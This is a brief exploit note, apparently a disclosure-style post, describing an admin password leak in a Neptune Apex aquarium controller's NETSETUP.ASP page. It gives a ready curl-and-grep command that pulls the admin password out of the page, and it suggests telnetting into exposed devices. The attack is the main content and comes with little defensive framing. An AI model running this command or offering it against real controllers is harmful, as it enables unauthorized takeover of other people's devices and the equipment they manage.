 ** Admin Password Leak **

Go to IP/NETSETUP.ASP Check the response / DOM the admin password is inside :)
You may be able to TELNET into it if its exposed.. but as said in the manual 

"Configure your Apex for external Internet access. Do this up front and Neptune support can
frequently telnet directly into your controller to help support you."


curl http://IP:PORT/NETSETUP.ASP | grep input | grep admin
